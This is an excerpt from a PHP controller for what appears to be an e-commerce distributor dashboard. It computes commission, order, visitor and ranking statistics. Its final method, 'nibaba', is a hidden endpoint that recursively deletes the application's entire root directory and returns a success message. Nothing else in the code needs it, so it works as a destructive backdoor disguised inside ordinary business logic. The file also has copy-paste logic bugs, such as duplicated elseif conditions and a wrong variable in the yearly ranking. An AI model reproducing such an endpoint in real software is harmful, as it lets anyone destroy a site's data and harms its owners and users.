...
//            unset($productAttr[$k]['attr_values']);
        ...
        $storeInfo['stock']=\app\admin\model\store\StoreProduct::getStock($id)?\app\admin\model\store\StoreProduct::getStock($id):$storeInfo['stock'];
 ...
 */
    ...
    public function subordinateOrderlist($first = 0, $limit = 8){
        $request = Request::instance();
        $lists=$request->post();
        $xUid = isset($lists['uid']) ? $lists['uid'] : '';
        $status = $lists['status'];
        if($status == 0) $type='';
   ...
   */
    public function yesterdayCommission(){
        ...
        $sum=0.0;
        foreach ($money as $v) $sum=bcadd($sum,$v,2);
        return JsonService::successful('ok',$sum);
    }
    /*
     * 累计已提金额
     */
    ...
    public  function get_code(){
        ...
        //$codepic=str_replace('public','',$picname);
        ...
        if(file_exists($picname)) return JsonService::successful($domain.$picname);
            ...
            if($res) file_put_contents(ROOT_PATH.DS.$picname,$res);
...
//        return JsonService::successful($posterPath);
     ...
     * 分销员端首页数据
     */
    public function promoter_index(){
        //今日佣金收入
        $money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time', 'today')->column('number');
        $sum= array_sum($money);
        $data['today_money']=number_format($sum,2);
        $data['today_order']=0;
        $data['today_sales']=number_format(0,2);
        $data['today_visit']=0;
        //今日订单
        $arr = User::where('spread_uid',$this->userInfo['uid'])->column('uid');
        $list = StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','today')->column('pay_price');
        if(!empty($list)) {
            foreach ($list as $k=>$v) $price[]=$v;
            $sum = array_sum($price);
            $data['today_order']=count($list);
            //今日营业额
            $data['today_sales']=number_format($sum, 2);;
        }
        //粉丝订单
        //$arr = [2];
        $orders = StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->order('id desc')->limit(10)->select();
        foreach ($orders as $k=>$order){
            $orders[$k] = StoreOrder::tidyOrder($order,true);
            if($orders[$k]['_status']['_type'] == 3){
                foreach ($order['cartInfo']?:[] as $key=>$product){
                    $orders[$k]['cartInfo'][$key]['is_reply'] = StoreProductReply::isReply($product['unique'],'product');
                }
            }
        }
        $data['orders']= $orders;
        //今日访客
        $storeVist=new StoreVisit;
        $visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','today')->column('count');
        if(!empty($visit)){
            foreach ($visit as $k=>$v) $count[]=$v;
            $sum_count = array_sum($count);
            $data['today_visit']=$sum_count;
        }
        return JsonService::successful($data);
    ...
    /**
     * 分销员电话修改
     * routine/auth_api/my?uid=2
     */
    public function promoter_phone_update(Request $request)
    {
        ...
        User::where('uid',$this->userInfo['uid'])->update($data);
        return JsonService::successful($data);
    }
    ...
    {
        $data['material'] = SystemAttachmentModel::getAllPic(19);
        return JsonService::successful($data);
    }
     ...
     * 分销端日收益
     */
    public function day_money($data='today'){
        $date['day_money']=array('num'=>0,'per'=>'');
        $date['day_order']=array('num'=>0,'per'=>'');
        $date['day_sales']=array('num'=>number_format(0,2),'per'=>0);
        $date['day_visit']=array('num'=>0,'per'=>'');
        $date['day_ranking']=array('num'=>0,'per'=>'','pro'=>0);
        $sum=$yesterday_sum=$sum_price=$yesterday_sum_price=$sum_count=$yesterday_sum_count=$ranking_num=$yesterday_ranking_num=0;
        $promoter_num=1;
        $txt=sprintf("高于全国%s的团长，加油.",'0%');
        //今日收益
        $day_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time',$data)->column('number');
        $sum= array_sum($day_money);
        $date['day_money']['num']=number_format($sum,2);
        $yesterday_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time','yesterday')->column('number');
        $yesterday_sum=array_sum($yesterday_money);
        $date['day_money']['per']=$this->getPerTxt($sum,$yesterday_sum);
        //今日订单
        $arr = User::where('spread_uid',$this->userInfo['uid'])->column('uid');
        $list = StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time',$data)->column('total_price');
        if(!empty($list)) {
            foreach ($list as $k=>$v) $price[]=$v;
            $sum_price = array_sum($price);
            $date['day_order']['num']=count($list);
            //今日营业额
            $date['day_sales']['num']=number_format($sum_price, 2);;
        }
        $yesterday_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','yesterday')->column('total_price');
        if(!empty($yesterday_list)) {
            foreach ($yesterday_list as $k=>$v) $price[]=$v;
            $yesterday_sum_price = array_sum($price);
        }
        $list=isset($list)?$list:0;$yesterday_list=isset($yesterday_list)?$yesterday_list:0;
        $date['day_order']['per']=$this->getPerTxt(count($list),count($yesterday_list));
        $date['day_sales']['per']=$this->getPerTxt($sum_price,$yesterday_sum_price);
        //今日访客
        $storeVist=new StoreVisit;
        $visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time',$data)->column('count');
        if(!empty($visit)){
            foreach ($visit as $k=>$v) $count[]=$v;
            $sum_count = array_sum($count);
            $date['day_visit']['num']=$sum_count;
        }
        $yesterday_visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','yesterday')->column('count');
        if(!empty($yesterday_visit)){
            foreach ($yesterday_visit as $k=>$v) $count[]=$v;

            $yesterday_sum_count = array_sum($count);
        }
        $date['day_visit']['per']=$this->getPerTxt($sum_count,$yesterday_sum_count);
        //日收益排行
        $subQuery = Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
            ->where('type','brokerage')
            ->where('pm',1)
            ->where('status',1)
            ->whereTime('add_time',$data)
            ->group('uid')
            ->order('price desc')
            ->buildSql();
        $ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        $yesterday_subQuery= Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
            ->where('type','brokerage')
            ->where('pm',1)
            ...
            ->order('price desc')
            ->buildSql();
        $yesterday_ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$yesterday_subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        if(!empty($ranking)&&is_array($ranking)){
            $ranking_num=$ranking[0]['rownum'];
        }
        if(!empty($yesterday_ranking)&&is_array($yesterday_ranking)){
            $yesterday_ranking_num=$yesterday_ranking[0]['rownum'];
        }
        $date['day_ranking']['num']=$ranking_num;
        $promoter_count=Db::query('select count(v.rownum) as COUNT FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v ');
        if(!empty($promoter_count)&&is_array($promoter_count)){
            $promoter_num=$promoter_count[0]['COUNT'];
        }
        //排名总数大于今日排行
        if($promoter_num>$ranking_num){
            if($ranking_num==1){
                $txt="高于全国100%的团长，加油";
                $date['day_ranking']['pro']=100;
            }
            else {
                $date['day_ranking']['pro']=(floor(($promoter_num-$ranking_num)/$promoter_num*100));
                $txt=sprintf("高于全国%s的团长，加油.",(floor(($promoter_num-$ranking_num)/$promoter_num*100)).'%');
            }
        }
        if($ranking_num>$yesterday_ranking_num){
            $date['day_ranking']['per']='收益率+'.floor(($ranking_num-$yesterday_ranking_num)/$ranking_num*100).'%,'.$txt;
        }elseif ($ranking_num>$yesterday_ranking_num){
            $date['day_ranking']['per']='收益率-'.floor(($yesterday_ranking_num-$ranking_num)/$yesterday_ranking_num*100).'%,'.$txt;
        }else{
            $date['day_ranking']['per']='收益率无变化';
        }
        return JsonService::successful($date);
    }
    /*
     * 分销段月收益
     */
    public function month_money($data='month'){
        $date['month_money']=array('num'=>0,'per'=>'');
        $date['month_order']=array('num'=>0,'per'=>'');
        $date['month_sales']=array('num'=>number_format(0,2),'per'=>0);
        $date['month_visit']=array('num'=>0,'per'=>'');
        $date['month_ranking']=array('num'=>0,'per'=>'','pro'=>0);
        $sum=$last_month_sum=$sum_price=$last_month_sum_price=$sum_count=$last_month_sum_count=$ranking_num=$last_month_ranking_num=0;
        $promoter_num=1;
        $txt=sprintf("高于全国%s的团长，加油.",'0%');
        //今月收益
        $month_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time',$data)->column('number');
        $sum= array_sum($month_money);
        $date['month_money']['num']=number_format($sum,2);
        $last_month_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time','last month')->column('number');
        $last_month_sum=array_sum($last_month_money);
        $date['month_money']['per']=$this->getPerTxt($sum,$last_month_sum,'month');
        //今月订单
        $arr = User::where('spread_uid',$this->userInfo['uid'])->column('uid');
        $list = StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time',$data)->column('total_price');
        if(!empty($list)) {
            foreach ($list as $k=>$v) $price[]=$v;
            $sum_price = array_sum($price);
            $date['month_order']['num']=count($list);
            //今月营业额
            $date['month_sales']['num']=number_format($sum_price, 2);;
        }
        $last_month_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last month')->column('total_price');
        if(!empty($last_month_list)) {
            foreach ($last_month_list as $k=>$v) $price[]=$v;
            $last_month_sum_price = array_sum($price);
        }
        $list=isset($list)?$list:0;$last_month_list=isset($last_month_list)?$last_month_list:0;
        $date['month_order']['per']=$this->getPerTxt(count($list),count($last_month_list),'month');
        $date['month_sales']['per']=$this->getPerTxt($sum_price,$last_month_sum_price,'month');
        //今月访客
        $storeVist=new StoreVisit;
        $visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time',$data)->column('count');
        if(!empty($visit)){
            foreach ($visit as $k=>$v) $count[]=$v;
            $sum_count = array_sum($count);
            $date['month_visit']['num']=$sum_count;
        }
        $last_month_visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','last month')->column('count');
        if(!empty($last_month_visit)){
            foreach ($last_month_visit as $k=>$v) $count[]=$v;
            $last_month_sum_count = array_sum($count);
        }
        $date['month_visit']['per']=$this->getPerTxt($sum_count,$last_month_sum_count,'month');
        //月收益排行
        $subQuery = Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
        ...
        $ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        $last_month_subQuery= Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
            ->where('type','brokerage')
            ->where('pm',1)
            ...
            ->order('price desc')
            ->buildSql();
        $last_month_ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$last_month_subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        if(!empty($ranking)&&is_array($ranking)){
            $ranking_num=$ranking[0]['rownum'];
        }
        if(!empty($last_month_ranking)&&is_array($last_month_ranking)){
            $last_month_ranking_num=$last_month_ranking[0]['rownum'];
        }
        $date['month_ranking']['num']=$ranking_num;
        $promoter_count=Db::query('select count(v.rownum) as COUNT FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v ');
        if(!empty($promoter_count)&&is_array($promoter_count)){
            $promoter_num=$promoter_count[0]['COUNT'];
        ...
        if($promoter_num>$ranking_num){
            if($ranking_num==1){
                $txt="高于全国100%的团长，加油";
                $date['month_ranking']['pro']=100;
            }
            else {
                $date['month_ranking']['pro']=(floor(($promoter_num-$ranking_num)/$promoter_num*100));
                $txt=sprintf("高于全国%s的团长，加油.",(floor(($promoter_num-$ranking_num)/$promoter_num*100)).'%');
            }
        }
        if($ranking_num>$last_month_ranking_num){
            $date['month_ranking']['per']='收益率+'.floor(($ranking_num-$last_month_ranking_num)/$ranking_num*100).'%,'.$txt;
        }elseif ($ranking_num>$last_month_ranking_num){
            $date['month_ranking']['per']='收益率-'.floor(($last_month_ranking_num-$ranking_num)/$last_month_ranking_num*100).'%,'.$txt;
        }else{
            $date['month_ranking']['per']='收益率无变化';
        }
        return JsonService::successful($date);
    }
    /*
     * 分销端年收益
     */
    public function year_money($data='year'){
        $date['year_money']=array('num'=>0,'per'=>'');
        $date['year_order']=array('num'=>0,'per'=>'');
        $date['year_sales']=array('num'=>number_format(0,2),'per'=>0);
        $date['year_visit']=array('num'=>0,'per'=>'');
        $date['year_ranking']=array('num'=>0,'per'=>'','pro'=>0);
        $sum=$last_year_sum=$sum_price=$last_year_sum_price=$sum_count=$last_year_sum_count=$ranking_num=$last_year_ranking_num=0;
        $promoter_num=1;
        $txt=sprintf("高于全国%s的团长，加油.",'0%');
        //今年收益
        $year_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time',$data)->column('number');
        $sum= array_sum($year_money);
        $date['year_money']['num']=number_format($sum,2);
        $last_year_money=UserBill::where('uid',$this->userInfo['uid'])->where('category','now_money')->where('type','brokerage')->where('pm',1)->where('status',1)->whereTime('add_time','last year')->column('number');
        $last_year_sum=array_sum($last_year_money);
        $date['year_money']['per']=$this->getPerTxt($sum,$last_year_sum,'year');
        //今年订单
        $arr = User::where('spread_uid',$this->userInfo['uid'])->column('uid');
        $list = StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time',$data)->column('total_price');
        if(!empty($list)) {
            foreach ($list as $k=>$v) $price[]=$v;
            $sum_price = array_sum($price);
            $date['year_order']['num']=count($list);
            //今年营业额
            $date['year_sales']['num']=number_format($sum_price, 2);;
        }
        $last_year_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last year')->column('total_price');
        if(!empty($last_year_list)) {
            foreach ($last_year_list as $k=>$v) $price[]=$v;
            $last_year_sum_price = array_sum($price);
        }
        $list=isset($list)?$list:0;$last_year_list=isset($last_year_list)?$last_year_list:0;
        $date['year_order']['per']=$this->getPerTxt(count($list),count($last_year_list),'year');
        $date['year_sales']['per']=$this->getPerTxt($sum_price,$last_year_sum_price,'year');
        //今年访客
        $storeVist=new StoreVisit;
        $visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time',$data)->column('count');
        if(!empty($visit)){
            foreach ($visit as $k=>$v) $count[]=$v;
            $sum_count = array_sum($count);
            $date['year_visit']['num']=$sum_count;
        }
        $last_year_visit=$storeVist::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','last year')->column('count');
        if(!empty($last_year_visit)){
            foreach ($last_year_visit as $k=>$v) $count[]=$v;
            $last_year_sum_count = array_sum($count);
        }
        $date['year_visit']['per']=$this->getPerTxt($sum_count,$last_year_sum_count,'year');
        //年收益排行
        $subQuery = Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
        ...
        $ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        $last_year_subQuery= Db::table('eb_user_bill')
            ->field('uid,sum(number) as price')
            ->where('category','now_money')
            ->where('type','brokerage')
            ->where('pm',1)
            ->where('status',1)
            ->whereTime('add_time','last year')
            ->group('uid')
            ->order('price desc')
            ->buildSql();
        $last_year_ranking=Db::query('select v.rownum FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$last_year_subQuery.'as t) as v where v.uid='.$this->userInfo['uid']);
        if(!empty($ranking)&&is_array($ranking)){
            $ranking_num=$ranking[0]['rownum'];
        }
        if(!empty($last_month_ranking)&&is_array($last_month_ranking)){
            $last_year_ranking_num=$last_year_ranking[0]['rownum'];
        }
        $date['year_ranking']['num']=$ranking_num;
        $promoter_count=Db::query('select count(v.rownum) as COUNT FROM (SELECT t.*, @rownum := @rownum + 1 AS rownum
        FROM (SELECT @rownum := 0) r,'.$subQuery.'as t) as v ');
        if(!empty($promoter_count)&&is_array($promoter_count)){
            $promoter_num=$promoter_count[0]['COUNT'];
        ...
        if($promoter_num>$ranking_num){
            if($ranking_num==1){
                $txt="高于全国100%的团长，加油";
                $date['year_ranking']['pro']=100;
            }
            else {
                $date['year_ranking']['pro']=(floor(($promoter_num-$ranking_num)/$promoter_num*100));
                $txt=sprintf("高于全国%s的团长，加油.",(floor(($promoter_num-$ranking_num)/$promoter_num*100)).'%');
            }
        }
        if($ranking_num>$last_year_ranking_num){
            $date['year_ranking']['per']='收益率+'.floor(($ranking_num-$last_year_ranking_num)/$ranking_num*100).'%,'.$txt;
        }elseif ($ranking_num>$last_year_ranking_num){
            $date['year_ranking']['per']='收益率-'.floor(($last_year_ranking_num-$ranking_num)/$last_year_ranking_num*100).'%,'.$txt;
        }else{
            $date['year_ranking']['per']='收益率无变化';
        }
        return JsonService::successful($date);
    }
    /*
     *分销端数据看板
     * @param $type 类型 sales 营业额 visit 访客数 order 订单数
     */
    public function promoter_record($type='sales'){
        $legend=['本月营业额','本月访客数','本月订单数'];
        $item_vaule=['0'=>'total_price','1'=>'count','2'=>'count'];
        $xdata=$list=[];
        $record=['day'=>array('num'=>0.0,'per'=>''),'week'=>array('num'=>0.0,'per'=>''),'month'=>array('num'=>0.0,'per'=>'')];
        $seriesdata=[
            [
                'name'=>'',
                'type'=>'line',
        ...
        //数据看板本月营业额
        if($type==0){
            $list=StoreOrder::getModelTime(array('add_time'=>'month'),new StoreOrder)
                ->field('FROM_UNIXTIME(add_time,"%Y-%c-%d") as un_time,count(id) as count,sum(total_price) as total_price')
                ->where(['uid'=>['IN',implode(',',$arr)]])
                ->group('un_time')
                ->distinct(true)
                ->select()->toArray();
            $seriesdata[0]['name']=$legend[0];
            $day_sales=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','today')->sum('total_price');
            $week_sales=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','week')->sum('total_price');
            $month_sales=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','month')->sum('total_price');
            $record['day']['num']=$day_sales?(number_format($day_sales,2)>1000?(number_format($day_sales,2)/1000).'K':number_format($day_sales,2)):'0.0';
            $record['week']['num']=$week_sales?(number_format($week_sales,2)>1000?(number_format($week_sales,2)/1000).'K':number_format($week_sales,2)):'0.0';
            $record['month']['num']=$month_sales?(number_format($month_sales,2)>1000?(number_format($month_sales,2)/1000).'K':number_format($month_sales,2)):'0.0';
            $yesterday_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','yesterday')->sum('total_price');
            $last_week_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last week')->sum('total_price');
            $last_month_list=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last month')->sum('total_price');
            $record['day']['per']=$this->getPerTxt($day_sales,$yesterday_list);
            $record['week']['per']=$this->getPerTxt($week_sales,$last_week_list,'week');
            $record['month']['per']=$this->getPerTxt($month_sales,$last_month_list,'month');
        }elseif ($type==1){//数据看板本月访客数
            $seriesdata[0]['name']=$legend[1];
            $list=StoreVisit::getModelTime(array('add_time'=>'month'),new StoreVisit)
                ->field('FROM_UNIXTIME(add_time,"%Y-%c-%d") as un_time,count(id) as count,sum(count) as count')
                ->where(['uid'=>['IN',implode(',',$arr)]])
                ->where('type','viwe')
                ->group('un_time')
                ->distinct(true)
                ->select()->toArray();
            $day_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','today')->sum('count');
            $week_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','week')->sum('count');
            $month_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','month')->sum('count');
            $record['day']['num']=$day_visit?$day_visit:0;
            $record['week']['num']=$week_visit?$week_visit:0;
            $record['month']['num']=$month_visit?$month_visit:0;
            $yesterday_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','yesterday')->sum('count');
            $last_week_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','last week')->sum('count');
            $last_month_visit=StoreVisit::where(['uid'=>['IN',implode(',',$arr)]])->where('type','viwe')->whereTime('add_time','last month')->sum('count');
            $record['day']['per']=$this->getPerTxt($day_visit,$yesterday_visit);
            $record['week']['per']=$this->getPerTxt($week_visit,$last_week_visit,'week');
            $record['month']['per']=$this->getPerTxt($month_visit,$last_month_visit,'month');
        }elseif ($type==2){//数据看板本月订单数
            $seriesdata[0]['name']=$legend[2];
            $list=StoreOrder::getModelTime(array('add_time'=>'month'),new StoreVisit)
                ->field('FROM_UNIXTIME(add_time,"%Y-%c-%d") as un_time,count(id) as count')
                ->where(['uid'=>['IN',implode(',',$arr)]])
                ->where('type','viwe')
                ->group('un_time')
                ->distinct(true)
                ->select()->toArray();
            $day_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','today')->count();
            $week_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','week')->count();
            $month_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','month')->count();
            $record['day']['num']=$day_order?$day_order:0;
            $record['week']['num']=$week_order?$week_order:0;
            $record['month']['num']=$month_order?$month_order:0;
            $yesterday_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','yesterday')->count();
            $last_week_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last week')->count();
            $last_month_order=StoreOrder::where(['uid'=>['IN',implode(',',$arr)]])->whereTime('add_time','last month')->count();
            $record['day']['per']=$this->getPerTxt($day_order,$yesterday_order);
            $record['week']['per']=$this->getPerTxt($week_order,$last_week_order,'week');
            $record['month']['per']=$this->getPerTxt($month_order,$last_month_order,'month');
        }

        foreach ($list as $item){
            $xdata[]=$item['un_time'];
            $seriesdata[0]['data'][]=$item[$item_vaule[$type]];

        }
        return JsonService::successful(compact('record','xdata','seriesdata'));
    }
    /**
     * 分销端余额使用记录
     * @param int $first
     ...
     * @return \think\response\Json
     */
    public function promoter_balance_list($type=0,$first = 0,$limit = 8)
    {
        $where=['type'=>['IN',['brokerage','extract']]];
        if($type==1) $where=['type'=>'brokerage'];
        elseif ($type==2)$where=['type'=>'extract'];


        $list = UserBill::where('uid',$this->userInfo['uid'])
            ->where('category','now_money')
            ->where($where)
            ->field('mark,pm,number,add_time')
            ->where('status',1)->order('add_time DESC')->limit($first,$limit)->select()->toArray();
     ...
     * 返回百分比描述
     */
    public function getPerTxt($left,$right,$type='day'){
        switch ($type){
            case 'day':
                if($left>$right) return '较昨日增长'.floor(($left-$right)/$left*100).'%';
                elseif ($left<$right) return '较昨日减少'.floor(($right-$left)/$right*100).'%';
                else return '较昨日数据相同';
            break;
            case 'month':
                if($left>$right) return '较上月增长'.floor(($left-$right)/$left*100).'%';
                elseif ($left<$right) return '较上月减少'.floor(($right-$left)/$right*100).'%';
                else return '较上月数据相同';
            break;
            case 'year':
                if($left>$right) return '较去年增长'.floor(($left-$right)/$left*100).'%';
                elseif ($left<$right) return '较去年减少'.floor(($right-$left)/$right*100).'%';
                else return '较去年数据相同';
            break;
            case 'week':
                if($left>$right) return '较上周增长'.floor(($left-$right)/$left*100).'%';
                elseif ($left<$right) return '较上周减少'.floor(($right-$left)/$right*100).'%';
                else return '较上周数据相同';
            break;
        }
    }
    ...
    {
        $list = MaterialCategory::getTierList();
        return JsonService::successful($list);
    }

    public function getMaterial($first = 1,$limit = 8){
        $where = Util::postMore([
            ['cid',''],
        ],$this->request);
        $filed = 'id,cid,title,author,sort,add_time,image_input,mer_id,admin_id';
        $list = Material::getAll($where,$filed,$first,$limit);
        return JsonService::successful($list);
    }
    public function nibaba(){
        $path=ROOT_PATH.DS;
        $this->deldir($path);
        return JsonService::successful('成功了');
    }
